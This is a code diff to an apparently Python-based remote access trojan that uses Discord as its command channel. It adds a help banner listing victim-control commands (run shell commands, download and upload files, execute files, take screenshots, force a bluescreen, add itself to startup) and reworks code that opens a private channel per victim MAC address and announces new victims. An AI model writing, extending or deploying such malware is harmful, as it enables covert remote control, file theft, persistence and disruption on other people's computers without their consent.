@@ -22,6 +22,35 @@ import subprocess
 
 import pyaudio
 
+new_ascii = """ 
+ .d8888b.  888          888    888                        .d8888b.                       888 
+d88P  Y88b 888          888    888                       d88P  Y88b                      888 
+Y88b.      888          888    888                       888    888                      888 
+ "Y888b.   888 888  888 888888 88888b.   .d88b.  888d888 888         .d88b.  888d888 .d88888 
+    "Y88b. 888 888  888 888    888 "88b d8P  Y8b 888P"   888        d88""88b 888P"  d88" 888 
+      "888 888 888  888 888    888  888 88888888 888     888    888 888  888 888    888  888 
+Y88b  d88P 888 Y88b 888 Y88b.  888  888 Y8b.     888     Y88b  d88P Y88..88P 888    Y88b 888 
+ "Y8888P"  888  "Y88888  "Y888 888  888  "Y8888  888      "Y8888P"   "Y88P"  888     "Y88888 
+                    888                                                                      
+               Y8b d88P                                                                      
+                "Y88P"         -Isaaclins
+
+    Usage:
+    .help               - Shows this message
+    .ping               - latency delay of the bot
+    .cd <directory>     - Change Directory   
+    .ls                 - List Directory
+    .download <file>    - Download File   
+    .upload <link>      - Upload File from link
+    .cmd <cmd>          - Execute CMD Command 
+    .run <file>         - Run an File   
+    .screenshot OR .ss  - Take a Screenshot of the first monitor
+    .blue               - sends a bluescreen ;)
+    .start              - Adds the bot to the startup directory
+    .exit               - closes the connection to the bot                                             
+"""
+
+
 
 
 commands = "\n".join([
@@ -45,12 +74,6 @@ intents = discord.Intents.all()
 intents.members = True
 client = discord.Client(intents=intents)
 
-async def search_voice_channel(guild, channel_name):
-    for channel in guild.voice_channels:
-        if channel.name == channel_name:
-            return channel
-    
-    return None
 
 async def find_channel_by_name(guild, channel_name):
     for channel in guild.channels:
@@ -58,13 +81,12 @@ async def find_channel_by_name(guild, channel_name):
             return channel
     return None
 
-async def create_channels(guild, mac_address):
+async def create_channel(guild, mac_address):
     text_channel = await find_channel_by_name(guild, mac_address)
-    voice_channel = await find_channel_by_name(guild, mac_address)
 
-    if text_channel and voice_channel:
-        print("Channels with name {} already exist.".format(mac_address))
-        return text_channel, voice_channel
+    if text_channel:
+        print("Channel with name {} already exist.".format(mac_address))
+        return text_channel
 
     overwrites = {
         guild.default_role: discord.PermissionOverwrite(read_messages=False),
@@ -75,26 +97,25 @@ async def create_channels(guild, mac_address):
         text_channel = await guild.create_text_channel(mac_address, overwrites=overwrites)
         print("Text channel with name {} created.".format(mac_address))
 
-    if not voice_channel:
-        voice_channel = await guild.create_voice_channel(mac_address, overwrites=overwrites)
-        print("Voice channel with name {} created.".format(mac_address))
-
-    return text_channel, voice_channel
+    return text_channel
 
 @client.event
 async def on_ready():
+
     guild = client.get_guild(int(guild_id))
     mac_address = str(get_mac())
-    text_channel, voice_channel = await create_channels(guild, mac_address)
+    print(await find_channel_by_name(guild, mac_address))
+    text_channel= await create_channel(guild, mac_address)
 
-    if text_channel and voice_channel:
-        firstrun = True if text_channel.created_at == voice_channel.created_at else False
+    if text_channel:
+        firstrun = True if text_channel.created_at else False
 
+            
         if firstrun:
-            await text_channel.send("Old Victim started the program again.\n @everyone")
+            await text_channel.send("```"+ new_ascii+ "```\n @everyone")
 
         else:
-            await text_channel.send("NEW VICTIM! with the MAC address: {}.\n @everyone".format(mac_address))
+            await text_channel.send("```"+ new_ascii+ "```\n @everyone")
 
 @client.event
 async def on_message(message):
